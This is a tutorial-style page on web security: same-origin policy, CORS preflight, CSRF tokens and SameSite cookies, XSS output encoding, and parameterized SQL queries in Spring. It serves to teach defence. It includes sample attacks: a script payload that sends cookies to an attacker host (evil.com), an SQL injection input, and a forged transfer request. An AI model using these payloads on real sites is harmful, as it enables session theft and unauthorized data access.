### Same-Origin Policy (SOP)

A **browser security mechanism** that restricts how a page from one origin can interact with resources from another origin.

**Origin** = protocol + domain + port. For example: `https://myapp.com:443`

|Request From|Request To|Same Origin?|
|---|---|---|
|`https://myapp.com`|`https://myapp.com/api/users`|Yes|
|`https://myapp.com`|`https://api.myapp.com`|No (different subdomain)|
|`https://myapp.com`|`http://myapp.com`|No (different protocol)|
|`https://myapp.com`|`https://myapp.com:8080`|No (different port)|

**What SOP blocks:**

- JavaScript on `evil.com` cannot **read responses** from `bank.com` API
- JavaScript on `evil.com` cannot **read cookies** of `bank.com`

**What SOP does NOT block:**

- Browser still **sends** the request (with cookies) — it just blocks the **response** from being read by JavaScript
- This is why CSRF is still possible without additional protection — the damage happens from sending the request, not reading the response

### Cross-Origin Resource Sharing (CORS)

**The problem:** In real-world apps, frontend and backend are often on different origins (e.g., frontend on `localhost:3000`, backend on `localhost:8080`). SOP blocks the frontend from **reading** backend responses — your API calls fail with a CORS error.

**CORS** is a mechanism where the **backend explicitly allows** specific origins to read its responses. It's the backend **relaxing** the browser's Same-Origin Policy for trusted origins.

#### Simple Requests (GET, simple POST with form data)

1. Browser sends the request with an `Origin: http://localhost:3000` header
2. Backend responds with `Access-Control-Allow-Origin: http://localhost:3000`
3. Browser checks — origin is allowed → JavaScript can read the response
4. If header is missing or doesn't match → browser blocks the response → CORS error

#### Preflight Requests (PUT, DELETE, custom headers, JSON content-type)

For "non-simple" requests, the browser first asks for **permission** before sending the actual request:

1. **Browser sends a preflight** — an `OPTIONS` request asking: "Can `localhost:3000` make a `DELETE` request with these headers?"

> `OPTIONS /api/employees/1` `Origin: http://localhost:3000` `Access-Control-Request-Method: DELETE` `Access-Control-Request-Headers: Authorization`

2. **Backend responds** with what's allowed:

> `Access-Control-Allow-Origin: http://localhost:3000` `Access-Control-Allow-Methods: GET, POST, PUT, DELETE` `Access-Control-Allow-Headers: Authorization`

3. Browser checks — everything matches → sends the **actual DELETE request**
4. If preflight is rejected → browser **never sends** the actual request

**When does preflight happen?**

- `PUT`, `PATCH`, `DELETE` methods
- Custom headers (like `Authorization`, `X-Custom-Header`)
- `Content-Type: application/json` (most API calls)
- Basically any request beyond a simple GET or form POST

**You can see preflight requests** in DevTools → Network tab → filter by `OPTIONS` method.

#### Spring Boot CORS Configuration

At controller level:

> `@CrossOrigin(origins = "http://localhost:3000")`

Or globally using a `WebMvcConfigurer` bean with `addCorsMappings()` to allow specific origins, methods, and headers for all endpoints.

**Important:** CORS is **not security** — it's the backend choosing to relax browser restrictions for trusted origins. It only works in browsers; tools like Postman or curl bypass it entirely.

### Security Headers Summary

|Header|Purpose|
|---|---|
|`SameSite`|Controls when cookies are sent cross-site (CSRF protection)|
|`HttpOnly`|Prevents JavaScript from reading cookies (XSS protection)|
|`Secure`|Cookie only sent over HTTPS|
|`Access-Control-Allow-Origin`|CORS — backend specifies which origins can read responses|
|`Referrer-Policy`|Controls how much URL info is shared across sites (supplementary)|

### Cross-Site Request Forgery (CSRF)

An attack that tricks a user into performing actions on a web application in which they are **already authenticated**, without their consent.

**How it works:** Browsers automatically attach cookies (including session cookies) to every request to a domain. A malicious site can make a hidden request to `bank.com/transfer?amount=1000` — your browser attaches your bank session cookie automatically. The bank thinks it's you.

**Why SOP doesn't prevent CSRF:** SOP blocks the attacker from **reading** the response, but the request (with cookies) is still **sent and executed** by the server. The transfer happens — the attacker doesn't need to read the response.

#### When to Worry About CSRF

- **Session/cookie based auth** → CSRF is a risk (browser sends cookies automatically)
- **JWT in Authorization header** → CSRF is NOT a risk (browser doesn't auto-send headers)
- **JWT in HttpOnly cookie** → CSRF IS a risk (browser sends cookies automatically)

> For how to protect HttpOnly JWT cookies from CSRF, see Page 5 (HttpOnly Cookie + CSRF Risk).

#### CSRF Prevention Methods

##### 1. CSRF Token (Traditional Approach)

1. Server generates an unpredictable **XSRF token** and sets it as a **non-HttpOnly cookie**
2. Your JavaScript reads the token from the cookie (`document.cookie`)
3. Your JavaScript sends it as a **custom request header** (`X-XSRF-TOKEN: abc123`)
4. Server compares: cookie value vs custom header value — if they match, request is legitimate

**Why this works:** Attacker's site can trigger a request (browser sends `Cookie: XSRF-TOKEN=abc123` automatically), but attacker **cannot read** your cookies (Same-Origin Policy) → can't set the `X-XSRF-TOKEN` custom header → server sees cookie present but custom header missing → rejects.

**How to verify in DevTools:** F12 → Network tab → click any request → Request Headers. You should see both `Cookie: XSRF-TOKEN=abc123` (sent automatically) and `X-XSRF-TOKEN: abc123` (set by JavaScript manually).

**Cookie settings (intentional):**

- Session cookie = `HttpOnly` → only server needs it, JS can't read it (XSS protection)
- XSRF token = NOT `HttpOnly` → JS must read it to set the custom header

##### 2. SameSite Cookie Attribute (Modern Approach)

Instead of CSRF tokens, modern apps use the `SameSite` attribute on cookies:

|Value|Behavior|
|---|---|
|`Strict`|Cookie never sent on cross-site requests|
|`Lax`|Cookie sent only on top-level navigations (clicking a link). Blocked on cross-site POST, AJAX, form submissions|
|`None`|Cookie always sent (must use `Secure` flag with HTTPS)|

**`SameSite=Lax`** is the most common — it blocks exactly what CSRF attacks use (cross-site POST/AJAX) while still allowing normal link navigation.

When `SameSite=Lax` is set, the app **doesn't need** the custom `X-XSRF-TOKEN` header mechanism — the browser itself prevents CSRF at the cookie level.

**How to check:** DevTools → Application tab → Cookies → check the `SameSite` column.

> **Note:** Some apps have an XSRF-TOKEN cookie even with `SameSite=Lax` — this is usually a framework default or fallback for older browsers that don't support `SameSite`.

##### 3. Stateless JWT (No Cookies)

If JWT is stored in **JavaScript memory** and sent via `Authorization: Bearer <token>` header (no cookies at all), CSRF is not a concern — the browser has nothing to send automatically.

> For full JWT storage comparison (memory, HttpOnly cookie, localStorage) with XSS/CSRF trade-offs, see Page 5.

### Cross-Site Scripting (XSS)

An attack where an attacker injects **malicious scripts** into web pages viewed by other users.

**Example:** Attacker submits as a comment: `<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>`

If the app renders this without sanitization, every user viewing it gets their cookies stolen.

**HttpOnly cookies** protect against XSS stealing tokens — JavaScript cannot access HttpOnly cookies.

#### How to Prevent

1. **Input Validation** — sanitize all user inputs, never trust client data
2. **Output Encoding** — encode user-provided data before rendering it on the page. "Output" = anything displayed that originally came from user input (comments, names, search results). Encoding converts `<script>` → `&lt;script&gt;` so the browser shows it as text instead of executing it.

> `HtmlUtils.htmlEscape(userInput);`

3. **HttpOnly cookies** — even if XSS occurs, attacker can't access HttpOnly cookies via `document.cookie`. This doesn't prevent XSS itself, but limits the damage.

### SQL Injection

An attack where attackers inject **malicious SQL** into input fields to manipulate database queries.

**Example:**

> Server query: `SELECT * FROM users WHERE username = 'input';` Attacker input: `' OR '1'='1` Resulting query: `SELECT * FROM users WHERE username = '' OR '1'='1';` This returns ALL users because `'1'='1'` is always true.

#### How to Prevent

**Parameterized queries** — SQL structure is fixed first, values are filled in separately. The database treats input as **pure data, never as SQL code**.

> Bad: `"SELECT * FROM users WHERE username = '" + input + "'";` — input becomes part of SQL structure. Good: Use `?` placeholder with `PreparedStatement` or `@Query` with `:param` — input is always treated as data, never as SQL code.

Spring Data JPA / Hibernate prevents this by default — uses parameterized queries. Never concatenate user input into raw SQL strings.

### Attack Summary

|Attack|Exploits|Prevention|
|---|---|---|
|CSRF|Browser automatically sending cookies|SameSite cookies, CSRF tokens, or stateless JWT|
|XSS|Rendering unsanitized user input|Input validation + Output encoding + HttpOnly cookies|
|SQL Injection|Concatenating user input into SQL|Parameterized queries + ORM|
